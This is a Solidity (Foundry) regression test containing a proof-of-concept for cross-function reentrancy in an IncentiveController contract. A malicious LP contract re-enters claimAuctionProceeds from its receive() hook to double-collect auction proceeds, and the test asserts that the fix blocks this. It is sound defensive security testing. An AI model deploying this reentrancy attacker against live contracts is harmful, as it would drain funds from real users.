// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../../contracts/incentives/IncentiveController.sol";

// =====================================================================
// Cross-function reentrancy PoC for IncentiveController.onLiquidityRemoved
// ---------------------------------------------------------------------
// Issue:
//   onLiquidityRemoved() (1) computes pending auction proceeds, (2) sends
//   ETH to the LP, then (3) updates rewardDebt. The function lacks
//   nonReentrant and the external call enables re-entry into the SIBLING
//   function claimAuctionProceeds(), which still observes the stale
//   rewardDebt and pays the same `pending` a second time.
//
// The AMM's nonReentrant lock does not extend across contracts.
// Once the hook fires the external call, the attacker can call back
// into IncentiveController.claimAuctionProceeds(), which reads the
// AMM's public liquidityBalance() (a view) and the un-updated rewardDebt
// in this contract — passing all checks and double-paying.
// =====================================================================

// Minimal AMM mock that mirrors the production state ordering:
// liquidityBalance is decremented BEFORE the hook is invoked, so
// hook callers see the post-removal balance via the public mapping.
contract ReentrancyAMM {
    mapping(bytes32 => mapping(address => uint256)) public liquidityBalance;
    mapping(bytes32 => uint256) public poolTotalLiquidity;

    IncentiveController public controller;

    function setController(address c) external {
        controller = IncentiveController(payable(c));
    }

    function setLiquidity(bytes32 poolId, address user, uint256 balance, uint256 total) external {
        liquidityBalance[poolId][user] = balance;
        poolTotalLiquidity[poolId] = total;
    }

    // Mirrors VibeAMM.removeLiquidity ordering: state is updated BEFORE the hook.
    function simulateRemove(bytes32 poolId, address lp, uint256 liquidity) external {
        uint256 prev = liquidityBalance[poolId][lp];
        liquidityBalance[poolId][lp] = prev > liquidity ? prev - liquidity : 0;
        uint256 prevTotal = poolTotalLiquidity[poolId];
        poolTotalLiquidity[poolId] = prevTotal > liquidity ? prevTotal - liquidity : 0;
        controller.onLiquidityRemoved(poolId, lp, liquidity);
    }

    function getPool(bytes32 poolId) external view returns (IAMMLiquidityQuery.Pool memory) {
        return IAMMLiquidityQuery.Pool({
            token0: address(0),
            token1: address(0),
            reserve0: 0,
            reserve1: 0,
            totalLiquidity: poolTotalLiquidity[poolId],
            feeRate: 30,
            initialized: true
        });
    }
}

// Malicious LP — on receive(), re-enters claimAuctionProceeds() to
// double-collect the same pending amount.
contract ReentrantLP {
    IncentiveController public controller;
    bytes32 public poolId;
    bool public reentered;
    uint256 public reentrantAmount;

    constructor(address _controller, bytes32 _poolId) {
        controller = IncentiveController(payable(_controller));
        poolId = _poolId;
    }

    receive() external payable {
        if (!reentered && msg.sender == address(controller)) {
            reentered = true;
            // Cross-function reentrancy: claimAuctionProceeds is nonReentrant
            // but onLiquidityRemoved (the original entry) is NOT — so this lock
            // is not held and the call proceeds.
            try controller.claimAuctionProceeds(poolId) returns (uint256 amt) {
                reentrantAmount = amt;
            } catch {}
        }
    }
}

contract IncentiveControllerCrossFnReentrancyTest is Test {
    IncentiveController public controller;
    ReentrancyAMM public amm;
    ReentrantLP public attacker;

    address public owner;
    address public coreAddr;
    address public treasuryAddr;

    bytes32 public constant POOL_ID = keccak256("attacker-pool");

    function setUp() public {
        owner = address(this);
        amm = new ReentrancyAMM();
        coreAddr = makeAddr("vibeSwapCore");
        treasuryAddr = makeAddr("treasury");

        IncentiveController impl = new IncentiveController();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeWithSelector(
                IncentiveController.initialize.selector,
                owner,
                address(amm),
                coreAddr,
                treasuryAddr
            )
        );
        controller = IncentiveController(payable(address(proxy)));
        amm.setController(address(controller));

        // Deploy attacker LP
        attacker = new ReentrantLP(address(controller), POOL_ID);

        // Seed AMM state: attacker holds 1000 LP out of 2000 total
        amm.setLiquidity(POOL_ID, address(attacker), 1000, 2000);

        // Onboard attacker through the add-liquidity hook so rewardDebt is checkpointed.
        vm.prank(address(amm));
        controller.onLiquidityAdded(POOL_ID, address(attacker), 1000, 0);
    }

    /// Post-fix invariant: the cross-function reentrancy must NOT double-pay.
    /// Pre-fix, attacker drained 0.5 ETH (2x). With CEI + nonReentrant, the
    /// reentrant claim either reverts (nonReentrant collision) or finds
    /// rewardDebt already checkpointed, leaving total drained at the legitimate
    /// per-hook share (0.25 ETH for the post-removal balance accounting).
    function test_crossFnReentrancy_isPrevented() public {
        // Distribute 1 ETH of auction proceeds across the pool.
        // attacker holds 1000 of 2000 LP at distribution time.
        bytes32[] memory poolIds = new bytes32[](1);
        poolIds[0] = POOL_ID;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1 ether;

        vm.deal(coreAddr, 1 ether);
        vm.prank(coreAddr);
        controller.distributeAuctionProceeds{value: 1 ether}(0, poolIds, amounts);

        // Fund the controller with extra ETH so any double-payout would be observable
        // (otherwise a second .call could fail on insufficient balance and confound
        // the test).
        vm.deal(address(controller), 2 ether);

        uint256 attackerBalBefore = address(attacker).balance;

        // Partial removal: attacker withdraws 500 of 1000 LP.
        vm.prank(address(amm));
        amm.simulateRemove(POOL_ID, address(attacker), 500);

        uint256 drained = address(attacker).balance - attackerBalBefore;

        // Without the fix, drained == 0.5 ether (2x the per-hook 0.25 ether).
        // With the fix (CEI debt checkpoint + nonReentrant), drained <= 0.25 ether.
        assertLe(drained, 0.25 ether, "cross-fn reentrancy double-paid");
        assertEq(attacker.reentrantAmount(), 0, "reentrant claim should have netted 0");
    }
}
